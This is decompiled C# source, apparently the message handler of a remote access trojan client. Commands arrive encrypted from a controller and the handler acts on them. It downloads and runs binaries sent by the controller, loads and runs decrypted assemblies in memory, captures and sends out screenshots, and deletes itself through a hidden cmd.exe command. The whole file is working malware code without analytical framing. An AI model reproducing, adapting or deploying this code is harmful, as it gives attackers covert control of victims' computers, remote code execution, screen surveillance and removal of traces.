using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Syn;

public class Messages
{
	private delegate object ExecuteAssembly(object sender, object[] parameters);

	public static object Sync = RuntimeHelpers.GetObjectValue(new object());

	public static void Read(byte[] Data)
	{
		try
		{
			Pack pack = new Pack();
			object[] array = pack.Deserialize(Helper.AES_Decryptor(Data));
			object obj = array[0];
			if (Operators.ConditionalCompareObjectEqual(obj, (object)PacketHeader.ClientShutdown, false))
			{
				try
				{
					Program.S.Shutdown(SocketShutdown.Both);
					Program.S.Close();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				Environment.Exit(0);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj, (object)PacketHeader.ClientDelete, false))
			{
				SelfDelete();
			}
			else if (Operators.ConditionalCompareObjectEqual(obj, (object)PacketHeader.ClientUpdate, false))
			{
				Program.Send((byte)8);
				string name = Conversions.ToString(array[1]);
				byte[] buffer = (byte[])array[2];
				object[] array2 = array;
				bool Update = Conversions.ToBoolean(array2[3]);
				Download(name, buffer, ref Update);
				array2[3] = Update;
			}
			else if (Operators.ConditionalCompareObjectEqual(obj, (object)PacketHeader.RemoteDesktopOpen, false))
			{
				Program.Send((byte)1);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj, (object)PacketHeader.RemoteDesktopSend, false))
			{
				Capture(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
			}
			else if (Operators.ConditionalCompareObjectEqual(obj, (object)PacketHeader.Reflection, false))
			{
				Program.Send((byte)8);
				Reflection((byte[])array[1]);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Program.Send((byte)3, ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private static void Download(string Name, byte[] Buffer, ref bool Update)
	{
		try
		{
			string text = Path.GetTempFileName() + Name;
			File.WriteAllBytes(text, Helper.AES_Decryptor(Buffer));
			Thread.Sleep(500);
			Process.Start(text);
			if (Update)
			{
				SelfDelete();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Program.Send((byte)3, ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private static void SelfDelete()
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Process.GetCurrentProcess().MainModule!.FileName;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = "cmd.exe";
			ProcessStartInfo startInfo = processStartInfo;
			try
			{
				Program.S.Shutdown(SocketShutdown.Both);
				Program.S.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Process.Start(startInfo);
			Environment.Exit(0);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Program.Send((byte)3, ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private static void Reflection(byte[] buffer)
	{
		try
		{
			object[] array = null;
			Assembly assembly = Thread.GetDomain().Load(Helper.AES_Decryptor(buffer));
			MethodInfo entryPoint = assembly.EntryPoint;
			if (entryPoint.GetParameters().Length > 0)
			{
				array = new object[1] { new string[1] { null } };
			}
			Thread thread = new Thread((ThreadStart)delegate
			{
				Thread.BeginThreadAffinity();
				Thread.BeginCriticalRegion();
				ExecuteAssembly executeAssembly = entryPoint.Invoke;
				executeAssembly(null, array);
				Thread.EndCriticalRegion();
				Thread.EndThreadAffinity();
			});
			if (array != null)
			{
				if (array.Length > 0)
				{
					thread.SetApartmentState(ApartmentState.STA);
				}
				else
				{
					thread.SetApartmentState(ApartmentState.MTA);
				}
			}
			thread.Start();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Program.Send((byte)3, ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	public static void Capture(int W, int H)
	{
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010a: Expected O, but got Unknown
		//IL_0116: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Expected O, but got Unknown
		object sync = Sync;
		ObjectFlowControl.CheckForSyncLockOnValueType(sync);
		bool lockTaken = false;
		try
		{
			Monitor.Enter(sync, ref lockTaken);
			try
			{
				Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				val2.set_CompositingQuality((CompositingQuality)1);
				Size size = new Size(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
				val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
				Bitmap val3 = new Bitmap(W, H);
				Graphics val4 = Graphics.FromImage((Image)(object)val3);
				val4.set_CompositingQuality((CompositingQuality)1);
				Rectangle rectangle = new Rectangle(0, 0, W, H);
				Rectangle rectangle2 = rectangle;
				Rectangle rectangle3 = new Rectangle(0, 0, Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
				val4.DrawImage((Image)(object)val, rectangle2, rectangle3, (GraphicsUnit)2);
				EncoderParameter val5 = new EncoderParameter(Encoder.Quality, 50L);
				ImageCodecInfo encoderInfo = GetEncoderInfo(ImageFormat.get_Jpeg());
				EncoderParameters val6 = new EncoderParameters(1);
				val6.get_Param()[0] = val5;
				MemoryStream memoryStream = new MemoryStream();
				((Image)val3).Save((Stream)memoryStream, encoderInfo, val6);
				Program.Send((byte)2, memoryStream.GetBuffer());
				try
				{
					memoryStream.Dispose();
					val2.Dispose();
					val4.Dispose();
					((Image)val3).Dispose();
					((Image)val).Dispose();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		finally
		{
			if (lockTaken)
			{
				Monitor.Exit(sync);
			}
		}
	}

	private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
	{
		ImageCodecInfo result = default(ImageCodecInfo);
		try
		{
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			int num = 0;
			while (true)
			{
				if (num < imageEncoders.Length)
				{
					if (imageEncoders[num].get_FormatID() == format.get_Guid())
					{
						break;
					}
					num = checked(num + 1);
					continue;
				}
				result = null;
				return result;
			}
			result = imageEncoders[num];
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
